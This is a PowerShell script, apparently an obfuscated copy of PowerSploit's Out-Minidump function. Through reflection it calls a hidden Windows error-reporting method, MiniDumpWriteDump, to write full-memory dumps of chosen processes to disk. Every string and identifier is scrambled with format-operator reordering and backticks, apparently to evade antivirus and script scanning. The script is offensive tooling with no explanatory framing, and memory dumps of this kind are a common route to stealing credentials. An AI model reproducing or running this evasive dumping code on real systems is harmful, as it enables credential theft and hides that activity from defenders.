  seT-iTeM  ("{1}{2}{0}"-f'bLE:wtj','vaR','iA')  ( [tYpe]("{0}{1}" -F 'p','SOBjeCT') ); SeT-ITEM ("Va"+"rIaBL"+"e"+":3A8") ( [Type]("{1}{0}{2}"-F'iLe','io.F','MOdE')  );  sET-vARIablE ("{0}{1}" -f'mw','1')  ( [TYpE]("{1}{0}"-f 'NTPtR','i')  )  ;  function OUT-MI`N`IdU`MP
{


    [CmdletBinding()]
    Param (
        [Parameter(poSition = 0, maNDaTORY = ${t`RUe}, VALUEFROmpipElINe = ${tR`UE})]
        [System.Diagnostics.Process]
        ${p`RO`cEss},

        [Parameter(POsitION = 1)]
        [ValidateScript({ .("{0}{1}{2}" -f 'Tes','t','-Path') ${_} })]
        [String]
        ${DUMPfi`lE`Pa`TH} = ${p`Wd}
    )

    BEGIN
    {
        ${W`er} =   (  varIABLe ("{0}{1}"-f 'WT','j')  -VAL )."asS`emB`LY".("{2}{1}{0}" -f 'Type','et','G').Invoke(("{7}{4}{6}{9}{0}{5}{3}{2}{8}{1}"-f 'u','dowsErrorReporting','n.W','matio','em.M','to','anagement.','Syst','in','A'))
        ${wErna`T`IV`eMe`THOdS} = ${w`Er}.("{1}{3}{0}{2}" -f'N','Ge','estedType','t').Invoke(("{3}{2}{1}{0}" -f'ethods','eM','ativ','N'), ("{2}{0}{1}"-f'ubli','c','NonP'))
        ${f`LAGS} = [Reflection.BindingFlags] ("{2}{0}{4}{1}{5}{3}" -f'nPubl',', S','No','c','ic','tati')
        ${m`In`iDUM`pwR`iT`eDUMp} = ${we`R`NAtIVemEtHo`dS}.("{1}{0}{2}"-f'tho','GetMe','d').Invoke(("{0}{2}{1}{5}{4}{3}"-f'Mini','Wr','Dump','mp','eDu','it'), ${f`la`Gs})
        ${m`INi`DuMPwItHf`U`lL`MEmoRY} = [UInt32] 2
    }

    PROCESS
    {
        ${p`Rocess`iD} = ${P`R`oCeSs}."id"
        ${p`R`oceSs`NamE} = ${procE`ss}."na`ME"
        ${Pr`oceSsH`A`NdLe} = ${pro`C`ess}."H`A`NDLe"
        ${p`RoC`Ess`FIlE`Na`Me} = "$($ProcessName)_$($ProcessId).dmp"

        ${PRO`ceSsDU`m`ppAtH} = .("{2}{1}{0}" -f 'n-Path','i','Jo') ${D`UM`PfiLep`Ath} ${pRO`cESsFiL`E`Name}

        ${F`ile`StReam} = &("{3}{0}{1}{2}"-f '-Ob','jec','t','New') ("{0}{1}{2}" -f'IO.F','ileSt','ream')(${PRoc`e`SSD`UMPpatH},   $3a8::"crE`ATe")

        ${ReS`ULt} = ${mIN`IDuMPwr`iT`E`Du`MP}."I`NVoKE"(${N`ULL}, @(${P`RocessHAn`d`le},
                                                     ${pRocE`s`siD},
                                                     ${FI`Lestr`Eam}."SAFe`FI`leh`ANDLE",
                                                     ${MiNidumP`wI`THf`UlLmEmoRy},
                                                       (itEm ("{3}{2}{1}{0}" -f'1','le:mw','arIaB','V')  ).VaLuE::"Z`eRO",
                                                       (dIR ("{2}{1}{0}{3}"-f'B','a','VarI','lE:mW1') ).VaLuE::"Z`ero",
                                                       ( geT-VAriaBle ("{0}{1}"-f 'MW','1') -vALUE)::"z`Ero"))

        ${FIl`est`Re`Am}.("{1}{0}" -f'lose','C').Invoke()

        if (-not ${rES`ULt})
        {
            ${Ex`ce`PTIOn} = .("{0}{1}{2}" -f'New-Ob','j','ect') ("{3}{2}{5}{1}{4}{0}"-f 'n','x','ponent','Com','ceptio','Model.Win32E')
            ${exC`EPTiOnMEs`SA`Ge} = "$($Exception.Message) ($($ProcessName):$($ProcessId)) "

            
            
            &("{0}{1}{2}" -f'Remove-It','e','m') ${P`ROcEs`Sdu`MPPAtH} -ErrorAction ("{2}{1}{0}{3}"-f 'tlyConti','len','Si','nue')

            throw ${E`xce`PtionMess`AGe}
        }
        else
        {
            .("{2}{1}{0}{3}" -f'ildIte','Ch','Get-','m') ${p`RoC`essdU`mp`Path}
        }
    }

    END {}
}